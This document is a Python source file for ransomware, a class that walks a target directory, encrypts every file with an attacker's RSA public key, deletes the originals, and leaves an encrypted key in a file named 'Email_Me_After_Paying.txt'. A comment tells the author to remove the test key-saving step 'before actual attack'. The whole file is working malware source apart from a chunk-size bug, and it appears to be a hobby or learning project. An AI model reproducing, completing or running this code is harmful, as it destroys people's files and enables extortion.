import base64
import os
import sys

from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend as crypto_default_backend
from cryptography.hazmat.primitives import serialization as crypto_serialization
from cryptography.hazmat.primitives.asymmetric import padding as crypto_padding
from cryptography.hazmat.primitives import hashes as crypto_hashes
from pathlib import Path


class Ransomware:
    def __init__(self):
        self.pubkey_pem = None
        self.privkey_pem = None
        self.attacker_public_key = None
        self.testflag = True
        self.attackroot = "/home/sri/Documents/PyCode/testFiles"

    def generate_asy_keys(self):
        private_key = rsa.generate_private_key(
            backend=crypto_default_backend(),
            public_exponent=65537,
            key_size=2048
        )
        self.pubkey_pem = private_key.public_key().public_bytes(
            crypto_serialization.Encoding.PEM,
            crypto_serialization.PublicFormat.SubjectPublicKeyInfo
        )
        self.privkey_pem = private_key.private_bytes(
            crypto_serialization.Encoding.PEM,
            crypto_serialization.PrivateFormat.PKCS8,
            crypto_serialization.NoEncryption())

    # Writes clients both keys to the disk. Delete private key section before actual attack.
    def write_keys(self):
        if self.testflag:
            with open('client_private_key.pem', 'wb') as f1:
                f1.write(self.privkey_pem)
        with open('client_public_key.pem', 'wb') as f2:
            f2.write(self.pubkey_pem)

    def enc_private_key(self):
        with open("./public.pem", "rb") as key_file:
            self.attacker_public_key = crypto_serialization.load_pem_public_key(key_file.read(),
                                                                                backend=crypto_default_backend())
        enc_blob = encrypt_blob(self.privkey_pem, self.attacker_public_key)
        with open("./Email_Me_After_Paying.txt", "wb") as fa:
            fa.write(enc_blob)
        self.privkey_pem = None

    def encrypt_system(self):
        arr = os.walk(self.attackroot, topdown=True)
        for root, directory, files in arr:
            for file in files:
                file_path = os.path.join(root, file)
                enc_file_blob = enc_file(file_path)
                os.remove(file_path)
                file_path = file_path + "cry"
                print(file_path)
                with open(file_path, 'wb') as fp:
                    fp.write(enc_file_blob)


def enc_file(filepath):
    with open("./public.pem", "rb") as key_file:
        attacker_public_key = crypto_serialization.load_pem_public_key(key_file.read(),
                                                                       backend=crypto_default_backend())
    with open(filepath, 'rb') as f:
        fileblob = f.read()
    enc_blob = encrypt_blob(fileblob, attacker_public_key)
    return enc_blob


def encrypt_blob(fileblob, attacker_public_key):
    chunk_size = 430
    offset = 0
    end_loop = False
    encrypted = b""
    while not end_loop:
        chunk = fileblob[offset: offset + chunk_size]
        if len(chunk) % chunk_size != 0:
            end_loop = True
            chunk += b" " * (chunk_size - len(chunk))
        # print(chunk)
        enc_chunk = attacker_public_key.encrypt(chunk, crypto_padding.OAEP(
            mgf=crypto_padding.MGF1(
                algorithm=crypto_hashes.SHA256()),
            algorithm=crypto_hashes.SHA256(),
            label=None
        ))
        encrypted += enc_chunk
        offset += chunk_size
    encrypted_blob = base64.b64encode(encrypted)
    return encrypted_blob


def main():
    foo = Ransomware()
    foo.generate_asy_keys()
    foo.write_keys()
    foo.enc_private_key()
    foo.encrypt_system()
    #print(arr)


if __name__ == '__main__':
    main()
